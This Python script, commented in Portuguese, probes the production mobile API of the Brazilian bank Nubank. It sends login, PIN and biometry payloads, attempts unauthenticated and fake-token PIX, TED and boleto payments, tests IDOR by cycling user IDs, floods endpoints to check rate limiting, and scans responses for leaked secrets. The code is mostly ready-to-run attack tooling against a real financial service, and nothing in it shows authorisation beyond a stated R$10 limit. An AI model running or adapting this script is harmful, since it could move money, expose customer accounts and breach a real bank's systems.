#!/usr/bin/env python3
"""
Script para interceptar e testar APIs móveis do Nubank
Foco em aplicações Android/iOS
"""

import requests
import json
import time
import base64
import hashlib
from urllib.parse import urljoin

class NubankMobileTester:
    def __init__(self):
        self.mobile_base = "https://prod-s0-webapp-proxy.nubank.com.br"
        self.session = requests.Session()
        self.setup_mobile_session()
        
    def setup_mobile_session(self):
        """Configura sessão simulando app móvel"""
        print("📱 Configurando sessão mobile...")
        
        self.session.headers.update({
            # Header obrigatório
            'X-Correlation-Id': 'bc-handle',
            
            # Headers móveis realistas
            'User-Agent': 'Nubank/8.45.0 (Android 10; SM-G975F)',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Accept-Language': 'pt-BR',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            
            # Headers específicos do app
            'X-Platform': 'android',
            'X-App-Version': '8.45.0',
            'X-Device-Model': 'SM-G975F',
            'X-OS-Version': '10',
            'X-Client-Type': 'mobile',
            
            # Headers de segurança
            'X-Request-Id': 'mobile-test-123',
            'X-Session-Token': 'test-session-token'
        })
    
    def test_mobile_authentication(self):
        """Testa autenticação móvel"""
        print("🔐 Testando autenticação móvel...")
        
        auth_endpoints = [
            "/api/mobile/auth/login",
            "/api/mobile/auth/refresh",
            "/api/mobile/auth/logout", 
            "/api/auth/mobile/token",
            "/api/mobile/session/validate",
            "/api/mobile/biometry/verify",
            "/api/mobile/pin/verify"
        ]
        
        # Payloads de teste para auth
        auth_payloads = [
            {
                "cpf": "11111111111",
                "password": "test123",
                "device_id": "test-device"
            },
            {
                "refresh_token": "invalid_token",
                "grant_type": "refresh_token"
            },
            {
                "pin": "1234",
                "transaction_id": "test123"
            },
            {
                "biometry_token": "fake_biometry",
                "challenge": "test_challenge"
            }
        ]
        
        for endpoint in auth_endpoints:
            print(f"  Testando: {endpoint}")
            
            for payload in auth_payloads:
                try:
                    response = self.session.post(
                        f"{self.mobile_base}{endpoint}",
                        json=payload,
                        timeout=10
                    )
                    
                    if response.status_code in [200, 201]:
                        print(f"  🚨 POSSÍVEL BYPASS AUTH! {endpoint}")
                        print(f"    Status: {response.status_code}")
                        
                        try:
                            data = response.json()
                            if 'token' in str(data) or 'access' in str(data):
                                print(f"    Token found: {str(data)[:100]}...")
                        except:
                            pass
                            
                except Exception as e:
                    print(f"    ❌ Erro: {e}")
                    
                time.sleep(0.3)
    
    def test_mobile_transactions(self):
        """Testa transações via mobile"""
        print("💳 Testando transações móveis...")
        
        transaction_endpoints = [
            "/api/mobile/pix/send",
            "/api/mobile/transfers/ted",
            "/api/mobile/payments/boleto",
            "/api/mobile/cards/transactions",
            "/api/mobile/limits/increase",
            "/api/mobile/balance/check",
            "/api/mobile/statements/download"
        ]
        
        # Payloads para transações (máximo R$ 10)
        transaction_payloads = [
            {
                "amount": 10.00,
                "pix_key": "test@test.com",
                "description": "Teste mobile"
            },
            {
                "value": 5.00,
                "account": "12345678",
                "bank": "001",
                "type": "ted"
            },
            {
                "amount": 1.00,
                "barcode": "12345678901234567890123456789012345678901234567890",
                "due_date": "2024-12-31"
            },
            {
                "card_id": "123",
                "amount": 2.00,
                "merchant": "Test Store"
            }
        ]
        
        for endpoint in transaction_endpoints:
            print(f"  Testando: {endpoint}")
            
            for payload in transaction_payloads:
                try:
                    # Teste sem autenticação
                    response = self.session.post(
                        f"{self.mobile_base}{endpoint}",
                        json=payload,
                        timeout=10
                    )
                    
                    if response.status_code in [200, 201, 202]:
                        print(f"  🚨 TRANSAÇÃO SEM AUTH! {endpoint}")
                        print(f"    Payload: {payload}")
                        print(f"    Status: {response.status_code}")
                    
                    # Teste com token inválido
                    headers_fake = {'Authorization': 'Bearer fake_token_123'}
                    response2 = self.session.post(
                        f"{self.mobile_base}{endpoint}",
                        json=payload,
                        headers=headers_fake,
                        timeout=10
                    )
                    
                    if response2.status_code in [200, 201, 202]:
                        print(f"  🚨 TOKEN INVÁLIDO ACEITO! {endpoint}")
                        
                except Exception as e:
                    print(f"    ❌ Erro: {e}")
                    
                time.sleep(0.5)
    
    def test_mobile_data_exposure(self):
        """Testa exposição de dados via mobile"""
        print("📊 Testando exposição de dados móveis...")
        
        data_endpoints = [
            "/api/mobile/profile",
            "/api/mobile/accounts/summary",
            "/api/mobile/cards/list",
            "/api/mobile/contacts",
            "/api/mobile/notifications",
            "/api/mobile/settings",
            "/api/mobile/documents",
            "/api/mobile/history/transactions",
            "/api/mobile/investments/portfolio",
            "/api/mobile/rewards/points"
        ]
        
        # Testar com diferentes user IDs
        user_ids = ["1", "2", "123", "user1", "admin", "test"]
        
        for endpoint in data_endpoints:
            print(f"  Testando: {endpoint}")
            
            try:
                # Teste direto
                response = self.session.get(
                    f"{self.mobile_base}{endpoint}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"  🚨 DADOS EXPOSTOS! {endpoint}")
                    try:
                        data = response.json()
                        print(f"    Data: {str(data)[:150]}...")
                    except:
                        print(f"    Text: {response.text[:150]}...")
                
                # Testar com user_id nos parâmetros
                for user_id in user_ids:
                    response2 = self.session.get(
                        f"{self.mobile_base}{endpoint}?user_id={user_id}",
                        timeout=10
                    )
                    
                    if response2.status_code == 200:
                        print(f"  🚨 IDOR COM USER_ID! {endpoint}?user_id={user_id}")
                        
            except Exception as e:
                print(f"    ❌ Erro: {e}")
                
            time.sleep(0.3)
    
    def test_mobile_rate_limiting(self):
        """Testa rate limiting em APIs móveis"""
        print("⏱️  Testando rate limiting...")
        
        critical_endpoints = [
            "/api/mobile/auth/login",
            "/api/mobile/pix/send",
            "/api/mobile/pin/verify"
        ]
        
        for endpoint in critical_endpoints:
            print(f"  Testando rate limit: {endpoint}")
            
            # Enviar múltiplas requisições rapidamente
            for i in range(20):
                try:
                    response = self.session.post(
                        f"{self.mobile_base}{endpoint}",
                        json={"test": f"request_{i}"},
                        timeout=5
                    )
                    
                    if i == 19:  # Última requisição
                        if response.status_code != 429:
                            print(f"  🚨 RATE LIMITING FRACO! 20 requests aceitas")
                            
                except Exception as e:
                    if "rate limit" not in str(e).lower():
                        print(f"    ❌ Erro: {e}")
                        
                time.sleep(0.1)  # Requisições rápidas
    
    def test_mobile_secrets(self):
        """Busca por segredos hardcoded"""
        print("🔑 Buscando segredos hardcoded...")
        
        # Endpoints que podem vazar informações
        info_endpoints = [
            "/api/mobile/config",
            "/api/mobile/version",
            "/api/mobile/debug",
            "/api/mobile/health",
            "/api/mobile/status",
            "/api/mobile/env"
        ]
        
        secret_patterns = [
            "api_key", "secret", "token", "password", "private_key",
            "aws_access", "database", "redis", "mongodb", "mysql"
        ]
        
        for endpoint in info_endpoints:
            try:
                response = self.session.get(
                    f"{self.mobile_base}{endpoint}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    for pattern in secret_patterns:
                        if pattern in response_text:
                            print(f"  🚨 POSSÍVEL SECRET! {endpoint}")
                            print(f"    Pattern: {pattern}")
                            print(f"    Context: {response.text[:200]}...")
                            break
                            
            except Exception as e:
                pass
    
    def test_pix_vulnerabilities(self):
        """Testa vulnerabilidades específicas do PIX"""
        print("💸 Testando vulnerabilidades PIX...")
        
        pix_endpoints = [
            "/api/mobile/pix/keys/register",
            "/api/mobile/pix/keys/list", 
            "/api/mobile/pix/send",
            "/api/mobile/pix/receive",
            "/api/mobile/pix/qrcode/generate",
            "/api/mobile/pix/qrcode/decode",
            "/api/mobile/pix/limits/check"
        ]
        
        # Testes específicos do PIX
        pix_tests = [
            {
                "endpoint": "/api/mobile/pix/keys/register",
                "payload": {"key": "test@test.com", "type": "email"},
                "risk": "Registro de chave PIX sem validação"
            },
            {
                "endpoint": "/api/mobile/pix/send", 
                "payload": {"amount": 10.00, "key": "admin@nubank.com.br"},
                "risk": "PIX para chaves internas/admin"
            },
            {
                "endpoint": "/api/mobile/pix/qrcode/generate",
                "payload": {"amount": 999999.99, "description": "Test"},
                "risk": "QR Code com valor excessivo"
            }
        ]
        
        for test in pix_tests:
            try:
                response = self.session.post(
                    f"{self.mobile_base}{test['endpoint']}",
                    json=test['payload'],
                    timeout=10
                )
                
                if response.status_code in [200, 201, 202]:
                    print(f"  🚨 PIX VULNERABILITY! {test['risk']}")
                    print(f"    Endpoint: {test['endpoint']}")
                    print(f"    Status: {response.status_code}")
                    
            except Exception as e:
                print(f"    ❌ Erro PIX: {e}")
    
    def run_mobile_tests(self):
        """Executa todos os testes móveis"""
        print("📱 Iniciando testes móveis do Nubank...")
        print("⚠️  Foco em aplicações Android/iOS")
        print("⚠️  Respeitando limite de R$ 10 por PoC")
        print("")
        
        try:
            self.test_mobile_authentication()
            print("")
            
            self.test_mobile_transactions()
            print("")
            
            self.test_mobile_data_exposure()
            print("")
            
            self.test_mobile_rate_limiting()
            print("")
            
            self.test_mobile_secrets()
            print("")
            
            self.test_pix_vulnerabilities()
            print("")
            
            print("📱 Testes móveis concluídos!")
            print("💡 Recomendações adicionais:")
            print("  1. Interceptar tráfego real do app com Burp Suite")
            print("  2. Analisar certificado pinning")
            print("  3. Verificar armazenamento local de tokens")
            print("  4. Testar deeplinks e intent filters")
            print("  5. Buscar por logs sensíveis no logcat")
            
        except Exception as e:
            print(f"❌ Erro geral mobile: {e}")

if __name__ == "__main__":
    mobile_tester = NubankMobileTester()
    mobile_tester.run_mobile_tests()
